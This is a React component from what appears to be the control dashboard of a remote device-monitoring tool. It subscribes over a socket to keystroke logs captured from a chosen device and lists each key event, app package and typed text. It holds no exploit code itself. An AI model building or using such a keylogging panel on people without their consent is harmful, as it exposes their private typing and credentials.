import React, { useState, useEffect } from "react";
import { useTranslation } from "react-i18next";
import { Typography, CircularProgress, Box } from "@mui/material";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";
import Color from "src/theme/colors";

const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const { onSocketMonitor, onSocketCloseMonitor } = useSocketFunctions();
  const { socket } = useSocket();

  const [changeLoading, setChangeLoading] = useState(false);
  const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);

  useEffect(() => {
    init();
  }, []);

  const onKeyMonitorResponse = (data) => {
    const deviceId = device?.deviceId;
    if (deviceId === data.deviceId) {
      // Update state by appending the new log data to the existing array
      setRecieveKeyLogs((prevLogs) => [
        ...prevLogs,
        { keyLogsType: data?.keyLogsType, keylogs: data?.keylogs, keyEvent: data?.keyevent },
      ]);
      setChangeLoading(false);
    }
  };

  const init = async () => {
    const deviceId = device?.deviceId;
    setChangeLoading(true);
    try {
      if (deviceId) {
        await onSocketMonitor(SocketIOPublicEvents.key_monitor, {
          deviceId,
        });

        // Receive the mic from server
        socket.on(`key-logs-shared-${deviceId}`, onKeyMonitorResponse);

        return () => {
          socket.off(`key-logs-shared-${deviceId}`);
        };
      }
    } catch (error) {
      console.error("Error monitoring device:", error);
      setChangeLoading(false);
    }
  };

  // Close the monitor modal
  const onCloseModal = async () => {
    try {
      setRecieveKeyLogs([]);

      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  return (
    <MonitorViewer
      initialState={{
        width: 600,
        height: 500,
        x: 50,
        y: -120,
        minWidth: 400,
        minHeight: 300,
        maxWidth: 700,
        maxHeight: 600,
      }}
      onClose={onCloseModal}
    >
      <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
        <Box
          sx={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            pt: 2,
            position: "relative",
            width: "100%",
            height: "100%",
          }}
        >
          <Box
            sx={{
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              alignItems: "space-between",
              width: "100%",
              height: "100%",
              overflow: "hidden",
              borderRadius: "5px",
            }}
          >
            <Box
              sx={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                px: 3,
                backgroundColor: Color.background.purple,
                py: 1,
              }}
            >
              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "left",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keyevent")}
                </Typography>
              </Box>
              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "center",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keypackage")}
                </Typography>
              </Box>
              <Box sx={{ flex: 1 }}>
                <Typography
                  component="h2"
                  sx={{
                    color: Color.text.primary,
                    textAlign: "right",
                    fontFamily: "Bebas Neue, sans-serif",
                  }}
                >
                  {t("devicesPage.monitors.keylogs")}
                </Typography>
              </Box>
            </Box>
            <Box
              sx={{
                backgroundColor: "black",
                border: `solid 1px ${Color.background.border}`,
                borderRadius: "5px",
                width: "100%",
                height: "500px",
                p: 1,
                overflowY: "auto",
              }}
            >
              {changeLoading && (
                <Box
                  sx={{
                    position: "absolute",
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "center",
                    alignItems: "center",
                    zIndex: 1,
                    color: "white",
                    width: "100%",
                  }}
                >
                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "center",
                      alignItems: "center",
                      backgroundColor: "#564FEE",
                      width: "30px",
                      height: "30px",
                      borderRadius: "5px",
                    }}
                  >
                    <CircularProgress sx={{ color: "white" }} size={20} />
                  </Box>
                </Box>
              )}

              {recieveKeyLogs.length !== 0 &&
                recieveKeyLogs
                  .slice()
                  .reverse()
                  .map((item, index) => (
                    <Box
                      key={index}
                      sx={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                      }}
                    >
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "left" }}
                        >
                          {item.keyEvent}
                        </Typography>
                      </Box>
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "center" }}
                        >
                          {item.keyLogsType}
                        </Typography>
                      </Box>
                      <Box sx={{ flex: 1 }}>
                        <Typography
                          component="h2"
                          sx={{ color: Color.text.primary, textAlign: "right" }}
                        >
                          {item.keylogs}
                        </Typography>
                      </Box>
                    </Box>
                  ))}
            </Box>
          </Box>
        </Box>
      </Box>
    </MonitorViewer>
  );
};

export default KeyLogsMonitorViewer;
